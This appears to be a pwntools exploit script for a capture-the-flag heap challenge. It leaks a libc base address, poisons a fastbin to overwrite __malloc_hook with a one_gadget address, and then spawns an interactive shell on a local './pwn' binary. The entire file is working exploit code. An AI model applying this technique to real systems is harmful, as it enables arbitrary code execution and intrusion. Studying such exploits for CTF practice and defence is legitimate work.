from pwn import *
context.arch = 'amd64'

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc = ELF("./libc.so.6")

def ch(c):
	io.sendlineafter(">>",str(c))

def addB(url,size,name):
	ch(1)
	io.sendafter("url: ",url)
	io.sendlineafter("size: ",str(size))
	if size != 0:
		io.sendafter("name: ",name)
def chgB(idx,url,name):
	ch(3)
	io.sendlineafter("index: ",str(idx))
	io.sendafter("url: ",url)
	io.sendafter("name: ",name)
def delB(idx):
	ch(2)
	io.sendlineafter("index: ",str(idx))

while True:
	try:
		io = process("./pwn",env = {"LD_PRELOAD":"./libc.so.6"})
		#gdb.attach(io,'handle SIGALRM nostop noprint')
		addB('ddnb\n',0x40,'0000')	#0
		addB('ddnb\n',0x800,'1111')	#1
		addB('ddnb\n',0x20,'2222')	#2
		delB(1)
		addB('ddnb\n',0x800,' ')	#1
		ch(4)
		io.recvuntil("index <1>: url: %64%64%6E%62%0A name: ")
		libase = u64(io.recv(6).ljust(8,'\x00'))-(libc.sym['__malloc_hook']+0x10)
		info("LIBC BASE -> %#x"%libase)
		addB('ddnb\n',0x6f0,'fuckyou')	#3
		addB('ddnb\n',0x68,'XXXX')	#4
		addB('ddnb\n',0x68,'YYYY')	#5
		addB('ddnb\n',0x68,'ZZZZ')	#6
		addB('ddnb\n',0x68,'WWWW')	#7
		delB(5)
		chgB(6,'%00'*0x10,p64(0)+p64(0x71)+p64(libase+libc.sym['__malloc_hook']-0x23))
		addB('ddnb\n',0x68,'fuckyou')
		pad = p64(0)+p64(0)+p64(libase+0xf02a4)
		addB('ddnb\n',0x68,'\x00'*3+pad)
		io.interactive()
	except Exception,e:
		io.close()
		info(str(e))

